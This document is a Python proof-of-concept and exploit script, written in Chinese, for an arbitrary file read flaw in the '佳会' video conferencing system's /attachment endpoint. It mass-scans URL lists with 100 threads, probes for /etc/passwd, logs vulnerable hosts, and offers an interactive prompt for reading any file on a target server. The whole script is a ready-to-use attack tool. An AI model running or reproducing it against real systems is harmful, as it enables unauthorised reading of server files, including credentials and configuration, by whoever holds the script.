import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type:佳会视频会议attachment接口存在任意文件读取漏洞
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="佳会视频会议attachment接口存在任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/attachment?file=/etc/passwd"
    res1 = requests.get(target,verify=False)
    try:
        if res1.status_code == 200:
            res2 = requests.get(target+payload,verify=False)
            if "root" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    return True
                print(f"该网站[+]{target}存在任意文件读取漏洞")
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print("访问超时，请重试")
    except Exception as e:
        print(e)
def exp(target):
    while True:
        payload = "/attachment?file="
        content = input("请输入要查看的文件，从/目录开始输入(q退出)\n>>>>>>>>>>>>>>>>")
        if content == "q":
            exit()
        res1 = requests.get(target, verify=False)
        if res1.status_code == 200:
            res2 = requests.get(target + payload + content, verify=False)
            if "DOCTYPE" in res2.text:
                print(f"文件不存在")
            else:
                print(res2.text)



if __name__ == '__main__':
    main()